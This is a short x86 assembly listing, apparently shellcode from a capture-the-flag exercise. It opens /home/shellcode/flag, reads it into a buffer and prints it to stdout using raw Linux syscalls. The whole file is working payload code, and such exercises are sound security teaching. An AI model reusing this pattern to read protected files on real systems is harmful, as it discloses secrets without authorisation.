BITS 32

section .text
global _start

_start:                     ; this is where code starts getting exec'ed
    xor eax,eax
    xor edx,edx
    push eax

    ;/home/shellcode/flag
    push 0x67616c66     ;galf
    push 0x2f65646f     ;/edo
    push 0x636c6c65     ;clle 
    push 0x68732f65     ;hs/e
    push 0x6d6f682f     ;moh/

    ; open /home/shellcode/flag
    mov ebx, esp      ; mov string's address to ebx 
    mov al,0x5        ; open(
    xor ecx, ecx      ;   read-only mode ( O_RDONLY )
    int 0x80          ; );

    ; read /home/shellcode/flag to a buffer
    mov ebx,eax       ;  file_descriptor,
    mov al,0x3        ;  read(
    mov ecx, mybuf    ;   mov buffer address to ecx 
    mov dl,0x50       ;   *bufsize
    int 0x80          ; );

    ; write buffer's content to STDOUT
    mov edx,eax       ; edx = len = read's return value
    xor ebx, ebx      ; clear ebx
    mov al,0x4        ; write(
    mov bl,0x1        ;   STDOUT,
    int 0x80          ; );

    ; exit(0)
    mov al, 0x1      ; exit(
    xor ebx, ebx     ;   0
    int 0x80         ; );

section .bss
mybuf: resb 0x50
